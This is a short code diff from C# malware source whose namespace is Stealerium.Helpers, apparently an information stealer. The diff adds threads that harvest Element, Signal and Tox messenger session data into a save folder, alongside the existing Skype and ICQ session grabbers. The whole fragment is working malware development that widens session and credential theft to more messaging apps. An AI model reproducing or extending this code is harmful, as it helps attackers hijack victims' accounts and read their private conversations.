@@ -63,6 +63,21 @@ namespace Stealerium.Helpers
                     Skype.GetSession(sSavePath + "\\Messenger\\Skype")
                 ));
 
+                // Write Element session
+                threads.Add(new Thread(() =>
+                    Element.GetSession(sSavePath + "\\Messenger\\Element")
+                ));
+
+                // Write Signal session
+                threads.Add(new Thread(() =>
+                    Signal.GetSession(sSavePath + "\\Messenger\\Signal")
+                ));
+
+                // Write Tox session
+                threads.Add(new Thread(() =>
+                    Tox.GetSession(sSavePath + "\\Messenger\\Tox")
+                ));
+
                 // Write icq session
                 threads.Add(new Thread(() =>
                     Icq.GetSession(sSavePath + "\\Messenger\\ICQ")
